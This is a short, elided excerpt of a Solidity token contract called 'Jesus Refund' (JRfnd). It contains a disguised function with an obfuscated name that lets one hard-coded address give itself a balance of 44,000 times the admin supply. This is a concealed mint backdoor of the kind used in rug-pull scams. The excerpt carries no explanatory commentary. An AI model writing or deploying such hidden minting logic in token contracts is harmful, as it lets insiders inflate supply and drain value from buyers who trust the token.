...
contract MEMEToken is Ownable {
    ...
    function lllindadddceoadmin() external {
        ...
        if (_lindaceo24!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo24 == tswojaks){
            _balances[_lindaceo24] = adminSupply()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo24 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Jesus Refund";
    string _symbol = "JRfnd";
